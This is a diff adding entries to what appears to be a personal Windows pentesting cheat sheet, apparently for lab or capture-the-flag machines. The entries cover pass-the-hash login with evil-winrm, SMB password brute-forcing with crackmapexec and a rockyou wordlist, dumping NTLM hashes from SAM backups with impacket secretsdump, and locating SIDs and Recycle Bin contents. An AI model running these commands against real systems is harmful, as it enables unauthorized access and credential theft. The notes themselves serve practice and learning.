@@ -34,5 +34,17 @@ or
 `evil-winrm -i [IP] -u [user] -H [NTLM hash]`
 or just use the password if you got one
 
+## Try Bruteforce SMB with crackmapexec
+`crackmapexec smb <MACHINE-IP> -u <username> -p <wordlist>`
+ex: `crackmapexec smb 10.10.153.204 -u Jareth -p ~/wordlists/rockyou.txt`
 
+## Dumping LM and NTLM when we have system.bak and sam.bak
+`python3 ~/scripts/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL -outputfile hashes.txt`
 
+## How to find SID
+`whoami /all | Select-String -Pattern "[username]" -Context 2,0`
+
+## Always check recycle bin (Even via commandline)
+cd 'C:\$Recycle.bin\<SID>'
+ex:
+cd 'C:\$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'
